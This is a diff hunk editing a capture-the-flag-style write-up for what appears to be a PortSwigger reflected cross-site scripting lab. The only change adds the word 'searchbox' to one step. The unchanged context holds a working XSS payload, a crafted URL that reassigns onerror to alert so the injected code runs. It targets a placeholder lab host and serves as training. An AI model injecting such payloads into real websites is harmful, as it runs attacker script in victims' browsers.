@@ -27,7 +27,7 @@ To solve the lab, perform a cross-site scripting attack that calls the `alert` f
 ![[XSS84.png]]
 The code shown above in the red block is that code that we use to exploit the web application.
 
-2. Now, copy the below payload and paste it into the `Website` box to perform "Reflected XSS".
+2. Now, copy the below payload and paste it into the `Website` searchbox to perform "Reflected XSS".
 ```python
 https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
 ```
